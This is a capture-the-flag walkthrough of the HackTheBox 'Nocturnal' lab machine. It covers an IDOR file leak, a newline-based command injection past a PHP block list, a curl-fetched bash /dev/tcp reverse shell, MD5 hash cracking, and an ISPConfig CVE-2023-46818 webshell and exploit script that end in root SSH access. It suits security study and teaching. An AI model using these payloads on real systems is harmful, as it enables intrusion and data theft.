[HTB: Nocturnal](/2025/08/16/htb-nocturnal.html)

![Nocturnal](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/nocturnal-cover.webp)

Nocturnal presents a website with an IDOR vulnerability that allows me to read other user’s files, and leak the admin password. Inside the admin panel, I’ll find a command injection vulnerability in the admin backup utility and exploit it to get a foothold. I’ll crack a hash to get the next user’s password. For root, there’s an instance of ISPConfig. I’ll exploit a PHP code injection vulnerability to get execution and a shell as root. In Beyond Root, I’ll look at the website file download feature before HTB patched it one week after Nocturnal’s release.

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

```

Based on the [OpenSSH and nginx versions](about:/cheatsheets/os#), the host is likely running Ubuntu 20.04 focal (though it could be 20.10 groovy as well).

The webserver is sending a redirect to `nocturnal.htb`. Given the use of virtual host routing, I’ll use `ffuf` to look for any subdomains of `nocturnal.htb` that respond differently. On finding none, I’ll add it to my `/etc/hosts` file:

```
10.10.11.64 nocturnal.htb
```

I’ll re-scan port 80 with `nmap` using the domain name:

```
oxdf@hacky$ nmap -p 80 -sCV nocturnal.htb

```

I’ll note the `PHPSESSID` cookie, which suggests a PHP website.

### Website - TCP 80

#### Site

The site is a cloud storage / file sharing site:

![image-20250413122731340](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413122731340.webp)

The login page at `/login.php` has a login form asking for username and password:

![image-20250413122915929](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413122915929.webp)

Guessing at some basic username / password combos only ever returns:

![image-20250413122956470](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413122956470.webp)

I am able to enumerate users through the registration link at `/register.php`. If I try to register the username admin it returns an error:

![image-20250413123036649](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413123036649.webp)

That suggests that this username is already registered.

Giving it the username 0xdf with the same password redirects back to the login page, where I can login. Logging in returns a dashboard where I can upload files and see my files:

![image-20250413123229299](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413123229299.webp)

If I try to upload an image file, it shows an error at the top right:

![image-20250413123414043](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413123414043.webp)

I’ll find a sample `.doc` file and upload it, and it shows up in “Your Files”:

![image-20250413124534420](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413124534420.webp)

The link is `/view.php?username=0xdf&file=file-sample_100kB.doc`. Clicking it does return the file.

#### Tech Stack

The HTTP response headers show an nginx server with a PHP session cookie:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 13 Apr 2025 16:28:56 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: PHPSESSID=ehi1elepd462f2jei3fbajt9tm; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 1524
```

The main page loads as `index.php`, and the other pages are all `.php` as well. This is clearly a PHP site.

The 404 page is the [default nginx 404](about:/cheatsheets/404#nginx) showing the OS is Ubuntu:

![image-20250413124751089](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413124751089.webp)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```
oxdf@hacky$ feroxbuster -u http://nocturnal.htb -x php

```

It looks like there’s a rule of some kind blocking anything starting with “uploads”. I’ll do some manual testing. `/upload` returns 404, but `/uploads` returns 403, as does `/uploads0xdf`, but not `/0xdfuploads`. It seems the rule is blocking any path that starts with `/uploads`.

There is an `admin.php`, but it redirects to `/login.php`. There’s also a `/backups/` that returns 403.

## Shell as www-data

### Access Admin Panel

#### Identify User Oracle / IDOR

The most interesting request made in playing with the site was to download a file. The URL is `/view.php?username=0xdf&file=file-sample_100kB.doc`. I’ll send that request to Burp Repeater and play with it a bit. If I change the filename to a different extension, it’s still checking that against either a block list or an allow list:

![image-20250414142857593](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414142857593.webp)

If I instead change the name leaving the extension as `.doc`, it sends a different error (and shows the available files):

![image-20250414142939085](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414142939085.webp)

If I set back the filename to what I uploaded and change the user, there’s another error:

![image-20250414143028349](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414143028349.webp)

If I register another account, another0xdf, and then try that name in this request with the file uploaded by 0xdf, it returns to the same error as having a bad file:

![image-20250414143206711](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414143206711.webp)

It shows no files for download, but I haven’t uploaded any for this user. I’ll upload `test.doc` as another0xdf, and then resend that request:

![image-20250414143335075](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414143335075.webp)

I’m requesting `file-sample_100kb.doc`, which is not found, but it is showing me a list of files from the another0xdf user. Through this end point not only can I validate that another0xdf is a user, but there’s an insecure direct object reference (IDOR) vulnerability that allows me to see and access that user’s files. I’ll change the filename to `test.doc`, and response includes that file.

A quick check for the admin user shows that they do exist, but have no files.

#### Brute Force Users

I’ll use `ffuf` to try a long list of names and see if any exist with the following options:

- `-u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.doc'` - The URL to test, with `FUZZ` where the username will insert from the wordlist. The `view.php` endpoint is much better than the registration endpoint for this, as the registration endpoint would create accounts when the user isn’t found.
- `-b 'PHPSESSID=lvn0jnogg9u3ntc0f6e6jcjbpg'` - Session cookie from my current session.
- `-w /opt/SecLists/Usernames/Names/names.txt` - [SecLists](https://github.com/danielmiessler/SecLists) is always my go-to for wordlists. `names.txt` is not too big, but has a bunch of names. I could try some others as well.
- `-fr 'User not found'` - Filter responses that have “User not found” in the response body. I could just as easily do `-mr 'File does not exist'`, as that implies that the user does (and assumes they don’t have a `test.doc`).
```
oxdf@hacky$ ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.doc' -b 'PHPSESSID=lvn0jnogg9u3ntc0f6e6jcjbpg' -w /opt/SecLists/Usernames/Names/names.txt -fr 'User not found'

tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 95ms]
```

It finds two more users as well as the admin user I had guessed already. The tobias user doesn’t have any files.

#### Amanda’s Password

The amanda user does have a file, `privacy.odt`:

![image-20250414152430863](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414152430863.webp)

I’ll visit `/view.php?username=amanda&file=privacy.odt` in the browser and it downloads the file. When the box first released, the file download was broken. I’ll cover that in [Beyond Root](#beyond-root---patched-website).

The file is a welcome letter with a password:

![image-20250414160954353](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414160954353.webp)

That password works for amanda to log into the website:

![image-20250414161211828](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414161211828.webp)

In addition to `privacy.odt`, there’s also a link to `/admin.php`

### RCE

#### Admin Panel Enumeration

The admin panel has a page showing the website and offering backups:

![image-20250414161323623](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414161323623.webp)

If I enter a password and click “Create Backup”, it shows the results in the panel below the button:

![image-20250414161740559](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414161740559.webp)

Right away I spot that this looks like the output of the `zip` command (and am immediately thinking command injection). Clicking “Download Backup” saves a file named `backup_2024-04-14.zip` to my system.

I’m able to unzip it using the password I gave:

```
oxdf@hacky$ unzip backup_2025-04-14.zip 
Archive:  backup_2025-04-14.zip

  inflating: view.php                
  inflating: logout.php              
  inflating: style.css
```

#### Site Source

Towards the top of each file that uses the database is a database connection that looks like:

```php
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
```

The most interesting file is `admin.php`, where the `zip` command is being run. Towards the bottom of the file I’ll find:

```php
...[snip]...
<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }
...[snip]...
```

It’s building a string from the POST request into the string and running it with `proc_open`. The user-submitted data does pass through the `cleanEntry` function first. This function is removing most of the special characters that would be used in command injection:

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '\`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```

#### Command Injection POC

One thing missed in the `cleanEntry` function is the `\n` character. A newline will make a new command in `proc_open`, as shown by this comment on the [php docs page](https://www.php.net/manual/en/function.proc-open.php):

![image-20250414162619438](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414162619438.webp)

I’ll submit for backup with the password “0xdf%0aid#”, which will make the command that creates the zip be:

```bash
zip -x './backups/*' -r -P 0xdf
id# backup_YYYY-MM-DD .  > /tmp/backup_UUID.log 2>&1 &
```

This fails:

![image-20250414164050222](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414164050222.webp)

It’s trying to run the command `id#`. Some playing around and I wasn’t able to get spacing right to make that work, but it occurs to me that this is not typical `bash` behavior. I’ll try running `bash -c` with a command, but space is also blocked. Tab (`%09`) is not though, so my password becomes `0xdf%0abash%09-c%09"id"#`, which makes the command:

```bash
zip -x './backups/*' -r -P 0xdf
bash    -c    "id"# backup_YYYY-MM-DD .  > /tmp/backup_UUID.log 2>&1 &
```

It works:

![image-20250414164433069](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414164433069.webp)

Ippsec later pointed out to me that just using another `%0a` at the end instead of a `#` would work as well.

#### Shell

I can’t use a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) directly because `&` is blocked. I’ll try `curl` with `0xdf%0abash%09-c%09"curl%09http://10.10.14.6/rev.sh"`. I’ll start a Python webserver (`python -m http.server 80`) and on sending that, I get a request at the server:

```
10.10.11.64 - - [14/Apr/2025 20:28:47] code 404, message File not found
10.10.11.64 - - [14/Apr/2025 20:28:47] "GET /rev.sh HTTP/1.1" 404 -
```

And the results show it failed to find `rev.sh`:

![image-20250414165913837](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414165913837.webp)

I’ll create a `rev.sh` with a rev shell in it:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

Now I’ll update my command to get this script and run it:

![image-20250414170241392](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414170241392.webp)

I’ve got two newlines, so it runs the `curl` call to get the file and then `bash rev.sh`. On sending, there’s a hit on the webserver that returns the file:

```
10.10.11.64 - - [14/Apr/2025 20:34:07] "GET /rev.sh HTTP/1.1" 200 -
```

And then a shell at my waiting `nc`:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.64 57644
bash: cannot set terminal process group (822): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nocturnal:~/nocturnal.htb$
```

I’ll do the standard [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
www-data@nocturnal:~/nocturnal.htb$ script /dev/null -c bash
Script started, file is /dev/null

```

## Shell as tobias

### Enumeration

#### Users

There’s one user with a home directory in `/home`:

```
www-data@nocturnal:/home$ ls
tobias
```

tobias, root, and two other users have shells configured in `/etc/passwd`:

```
www-data@nocturnal:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
ispapps:x:1001:1002::/var/www/apps:/bin/sh
ispconfig:x:1002:1003::/usr/local/ispconfig:/bin/sh
```

www-data cannot read files in `/home/tobias`. There is no `/var/www/apps` directory (maybe left over from a no longer existing site). I’ll come back to ispconfig later.

#### Web Directories

In `/var/www/` there are multiple directories:

```
www-data@nocturnal:~$ ls
html  ispconfig  nocturnal.htb  nocturnal_database  php-fcgi-scripts
```
- `html` has the default nginx page.
- `nocturnal.htb` has the website I’ve already interacted with.
- `nocturnal_database` contains a single file, `nocturnal_database.db`
- `php-fcgi-scripts` contains two directories, both of which contain a single `.php-fcgi-starter` file.
- `ispconfig` has another web application. I’ll come back to this for root.

#### nocturnal\_database.db

The database has two tables:

```
www-data@nocturnal:~$ sqlite3 nocturnal_database/nocturnal_database.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
uploads  users
```

`uploads` isn’t too interesting. `users` has password hashes for the users on the site:

```
sqlite> .headers on
sqlite> select * from users;
id|username|password
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|0xdf|465e929fc1e0853025faad58fc8cb47d
7|another0xdf|465e929fc1e0853025faad58fc8cb47d
```

These hashes look like MD5s given their 32 hex characters. The source code from `login.php` confirms:

```php
if ($result && md5($password) === $result['password']) {
    $_SESSION['user_id'] = $result['id'];
    $_SESSION['username'] = $username;
    header('Location: dashboard.php');
    exit();
} else {
    $error = 'Invalid username or password.';
}
```

### su / SSH

I’ll try the hashes for admin and tobias in [CrackStation](https://crackstation.net/):

![image-20250414172223946](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414172223946.webp)

tobias’ password works with `su` for the system password:

```
www-data@nocturnal:~$ su - tobias
Password: 
tobias@nocturnal:~$
```

It also works over SSH from my host:

```
oxdf@hacky$ sshpass -p 'slowmotionapocalypse' ssh tobias@nocturnal.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)
...[snip]...
tobias@nocturnal:~$
```

The user flag is in tobias’ home directory:

```
tobias@nocturnal:~$ cat user.txt
8c2ce65e************************
```

## Shell as root

### Enumeration

#### Users

There’s nothing interesting in tobias’ home directory other than `user.txt`:

```
tobias@nocturnal:~$ ls -la

```

tobias cannot run `sudo`:

```
tobias@nocturnal:~$ sudo -l
[sudo] password for tobias: 
Sorry, user tobias may not run sudo on nocturnal.
```

#### ISP

Looking at the listening ports, there’s something listening on port 8080 that I couldn’t reach before:

```
tobias@nocturnal:~$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State

tcp6       0      0 :::22                   :::*                    LISTEN
```

There’s a `php` process running as root listening on port 8080:

```
tobias@nocturnal:~$ ps auxww | grep 8080
root         814  0.0  0.6 211568 27012 ?        Ss   20:17   0:00 /usr/bin/php -S 127.0.0.1:8080
tobias      2288  0.0  0.0   6432   720 pts/2    S+   21:32   0:00 grep --color=auto 8080
```

I don’t know for sure what directory this is running out of, but I can guess that this matches up with the `ispconfig` directory from `/var/www`. Interestingly, tobias can’t enter that directory:

```
tobias@nocturnal:/var/www$ cd ispconfig
-bash: cd: ispconfig: Permission denied
```

But www-data can:

```
www-data@nocturnal:~$ cd /var/www/ispconfig
www-data@nocturnal:~/ispconfig$ ls
admin        dashboard          index.php      mailuser    sites          vm
capp.php     datalogstatus.php  js             monitor     strengthmeter
client       dns                keepalive.php  nav.php     temp
common.php   dummy_login.html   login          remote      themes
content.php  help               mail           robots.txt  tools
```

#### Site

I’ll reconnect over SSH with `-L 9001:localhost:8080` to tunnel my local port 9001 to port 8080 on Nocturnal (I could pick any port to listen on locally - 8080 is already in use, so I’ll go with 9001). Now on visiting `http://127.0.0.1:9001` in my browser, the [IPSConfig](https://www.ispconfig.org/) login page loads:

![image-20250414173143332](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414173143332.webp)

Looking at the page source there’s a hint that this might be version 3.2:

![image-20250414173259769](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414173259769.webp)

tobias’ password doesn’t work for a tobias user, but it does work for admin:

 ![image-20250414173513864](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414173513864.webp)![expand](/icons/expand.png)

The “Help” page confirms the version:

![image-20250414173553674](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414173553674.webp)

### Identify CVE-2023-46818

Searching for “ispconfig cve” returns a couple interesting CVEs:

![image-20250414174733421](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414174733421.webp)

CVE-2024-53720 as an SSRF could be interesting, but I’ll start with CVE-2023-46818 as it mentions “PHP code injection” which can be execution.

The description on the [NIST page](https://nvd.nist.gov/vuln/detail/CVE-2024-53720) says:

> An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if admin\_allow\_langedit is enabled.

The version on Nocturnal should be vulnerable.

### CVE-2023-46818 \[Manual\]

#### Code Injection POC

Well before Nocturnal’s release, there is a POC exploit Python script on GitHub, and that’s the intended way to solve the box. I’ll still take a section to show how the vulnerability works manually.

The issue is in the `/admin/language_edit.php` function. I’ll send an authenticated request over to Burp Repeater (check out my [FoxyProxy/Burp setup](https://www.youtube.com/watch?v=iTm33Miymdg) and make sure `network.proxy.allow_hijacking_localhost` is true in Firefox’s about:config) and make it a post, get rid of unnecessary headers, and add the post body to creat a language file:

![image-20250813104118396](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813104118396.webp)

In this response, I need the CSRF id and key at the very bottom:

![image-20250813104144096](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813104144096.webp)

I’ll add those two values along with a command injection payload in the `records[\]` parameter:

![image-20250813104259651](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813104259651.webp)

I’m having it `ping` my host one time. It shows the results in the response, and I can see it at `tcpdump` on my host:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:42:21.141465 IP 10.10.11.64 > 10.10.14.6: ICMP echo request, id 4, seq 1, length 64
14:42:21.141492 IP 10.10.14.6 > 10.10.11.64: ICMP echo reply, id 4, seq 1, length 64
```

If I want to change the command, I have to create a new lang file and get new CSRF data, or it returns “CSRF attempt blocked”:

![image-20250813104439640](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813104439640.webp)

#### File Write

In the POC, it writes a webshell using `file_put_contents`, like this (with a fresh `lang_file` and CSRF):

![image-20250813103715037](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813103715037.webp)

That file is not only there, but accessible without auth:

```
oxdf@hacky$ curl localhost:9001/admin/0xdf.txt
owned_by_0xdf
```

I’ll create a new `.lng` file, get the CSRF data, and then write a shell. Writing special characters is hard, so I’ll base64-encode and decode:

```
oxdf@hacky$ echo '<?php system($_REQUEST["cmd"]) ; ?>' | base64
PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pIDsgPz4K
```

Now I’ll write a webshell:

![image-20250813110133437](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813110133437.webp)

And it works:

```
oxdf@hacky$ curl localhost:9001/admin/0xdf.php?cmd=id
uid=0(root) gid=0(root) groups=0(root)
```

### CVE-2023-46818 \[Exploit Script\]

There’s a [Python POC](https://github.com/bipbopbup/CVE-2023-46818-python-exploit) from bipbopbup on GitHub that released 6 months before Nocturnal. I’ll save a copy on my host. It imports the `requests` library, so I’ll use the preferred `uv` [workflow](about:/cheatsheets/uv#) to add that to the script and run it in a unique virtual environment.

First I add it:

```
oxdf@hacky$ uv add --script cve-2023-46818.py requests
Updated \`cve-2023-46818.py\`
```

This adds this comment to the top of the script:

```python
# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "requests",
# ]
# ///
```

Now I’ll run it with `uv`:

```
oxdf@hacky$ uv run cve-2023-46818.py 
Installed 5 packages in 7ms

Usage: python cve-2023-46818.py <URL> <Username> <Password>
```

It installs the packages (`requests`) needed for the script into a virtual environment (which takes 7ms), and then runs showing the help.

I’ll run with those arguments:

```
oxdf@hacky$ uv run cve-2023-46818.py http://localhost:9001 admin slowmotionapocalypse
[+] Target URL: http://localhost:9001/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell#
```

This exploit writes a webshell to the target and then enters a `while True` loop reading a command and sending it to the webshell. It’s running as root:

```
ispconfig-shell# id      
uid=0(root) gid=0(root) groups=0(root)
```

### SSH

The public POC provides an annoying shell because it doesn’t keep any kind of state. Even with my own webshell or a reverse shell, it can be far more stable to upgrade using SSH. I’ll write my SSH public key into `authorized_keys` for root:

```
ispconfig-shell# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
" > /root/.ssh/authorized_keys
```

Now I can connect over SSH using that key:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@nocturnal.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)
...[snip]...
root@nocturnal:~#
```

And grab `root.txt`:

```
root@nocturnal:~# cat root.txt
0a081553************************
```

## Beyond Root - Patched Website

### Background

When Nocturnal first released, the downloaded file feature in the website was a bit broken. This was fixed to return the file in the patch on 17 April 2025:

![image-20250418140100858](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250418140100858.webp)

### Header Issue

For the original release, it has to do with how the file came back HTML-wrapped. When there’s a failure, the response headers send a `Content-Type` of `text.html`:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Apr 2025 20:39:11 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 3113

...[snip]...
    <div class='error'>File does not exist.</div><h2>Available files for download:</h2><ul><li><a href="view.php?username=amanda&file=privacy.odt">privacy.odt</a></li></ul>
</div>

</body>
</html>
```

When I get the right file, the headers send `application/octet-stream`, even though it’s still an HTML page:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Apr 2025 20:39:17 GMT
Content-Type: application/octet-stream

<!DOCTYPE html>
<html lang="en">
<head>
...[snip]...
<div class="container">
    <h1>File Viewer</h1>

    PK
...[snip]...
```

The `.odt` file is embedded in the page. So the resulting file is HTML with the file in it. I have no idea why the site is designed this way - pretty poor design. Opening this file in Libre Office shows the HTML with the embedded file:

![image-20250415164217705](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250415164217705.webp)

### Recover File

There’s a few ways to recover the raw file. I just open `vim` and delete all the bytes up until the `PK` magic bytes and save.

If I open it in Word, it’ll offer to recover the file:

![image-20250415164450447](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250415164450447.webp)

Saying yes will remove all the HTML and open it correctly.

Office files are just zip archives, and `zip` will also ignore the HTML and unzip the legit zip:

```
oxdf@hacky$ unzip privacy.odt
Archive:  privacy.odt
warning [privacy.odt]:  2919 extra bytes at beginning or within zipfile
  (attempting to process anyway)

  inflating: settings.xml            
 extracting: Thumbnails/thumbnail.png  
  inflating: META-INF/manifest.xml
```

I can then re-zip it, or just get the text from `content.xml`:

```
oxdf@hacky$ xmllint --format content.xml
